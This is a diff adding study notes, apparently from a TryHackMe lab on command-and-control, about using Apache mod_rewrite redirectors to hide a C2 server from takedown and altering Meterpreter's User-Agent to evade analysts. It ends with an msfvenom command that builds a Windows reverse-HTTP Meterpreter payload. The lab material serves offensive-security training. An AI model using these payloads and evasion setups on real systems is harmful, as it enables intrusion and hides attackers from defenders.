@@ -502,6 +502,64 @@ hashdump
 
 # [Task 7  Advanced C2 Setups]()
 
+### There's Always Room for Improvement
+- As you may have guessed, Metasploit itself is not that great of a C2 server for advanced adversary operations. 
+- It's not as flexible as one would desire; you cannot configure agents to beacon out every X seconds with Y jitter. 
+- A Next-Generation Firewall could quickly pick up on this C2 traffic, seeing it's a constant stream of traffic. 
+- In addition, anyone could connect to an HTTP/HTTPS listener and find out relatively quickly what is going on.
+
+### Command and Control Redirectors 
+#### What is a Redirector?
+- Before we dive into configuring a Redirector, first, what is it? A Redirector is exactly as it sounds. 
+- It's a server that "Redirects" HTTP/HTTPS requests based on information within the HTTP Request body. 
+- In production systems, you may see a "Redirector" in the form of a Load Balancer. 
+- This server often runs Apache 2 or NGINX. For this lab, we will be leveraging Apache and some of its modules to build a Redirector.
+- Jumping back into Metasploit, we can set up some basic configurations on Metasploit to allow for more advanced configurations, in this task; we will be setting up a Redirector. 
+- Usually, this configuration is set up on multiple hosts; the purpose of this is to hide the true Command and Control server. 
+- The diagram below illustrates how communications between a victim and a C2 server happen.
+  > ![image](https://user-images.githubusercontent.com/51442719/180653538-e10b6e5f-cff4-4a87-9019-b9fb2f182efb.png)
+  > - *Illustration of a C2 and Redirector with victims calling back*
+- Usually, when you have a C2 callback, you may set the callback host to a Domain, let's say admin.tryhackme.com. 
+- It's very common for your C2 Server to get reported, when a user files a complaint. 
+- Usually, the server gets taken down fairly quickly. 
+- It can sometimes be as little as 3 hours and as much as 24. 
+- Setting up a redirector ensures that any information you may have collected during the engagement is safe and sound. 
+- But how does this stop the C2 Server from being taken down? Surely if someone fingerprinted Cobalt Strike on your C2 Server, someone would file a complaint, and it would get taken down. 
+- This is true, so you should set up a Firewall to only allow communication to and from your redirector(s) to mitigate any potential risks.
+  > ![image](https://user-images.githubusercontent.com/51442719/180653615-368520da-1308-4396-9bf6-36f0d3938607.png)
+  > - *Illustration of how a C2 Server and a Redirector should interact*
+
+#### How is a Redirector Setup?
+- Before we dive into configuring a redirector, we must first understand how one is set up; we will be aligning this to the tools we have available, which are Metasploit and Apache2. 
+- In Apache, we will be leveraging a module called "mod_rewrite" (or the Rewrite module). 
+- This module allows us to write rules to forward requests to internal or external hosts on a server based on specific HTTP headers or content. 
+- We will need to use several modules to configure our Redirector. 
+- The following modules must be enabled:
+  - rewrite
+  - proxy
+  - proxy_http
+  - headers
+> 💡 `Note`: If you are using the Attack Box, there is already a service running on port 80 - you must change the default port that Apache listens on in /etc/apache2/ports.conf. 
+> - You must do this before starting the Apache 2 service, or it will fail to start.
+- You can install apache 2 and enable it with the following commands:
+```cmd
+apt install apache2
+```
+```cmd
+a2enmod rewrite && a2enmod proxy && a2enmod proxy_http && a2enmod headers && systemctl start apache2 && systemctl status apache2
+```
+- Using Meterpreter, we have the ability to configure various aspects of the HTTP Request, for example, the User-Agent. 
+- It is very common for a threat actor to make a slight adjustment to the User-Agent in their C2 HTTP/HTTPS payloads. 
+- It's in every HTTP request, and they all more or less look the same, and there is a very good chance a security analyst may overlook a modified user agent string. 
+- For this demonstration, we will generate a Meterpreter Reverse HTTP payload using MSFvenom; then we will inspect the HTTP request in Wireshark. 
+
+#### Generating a Payload with Modified Headers 
+```cmd
+msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
+```
+
+
+
 ---
 
 # [Task 8  Wrapping Up]()
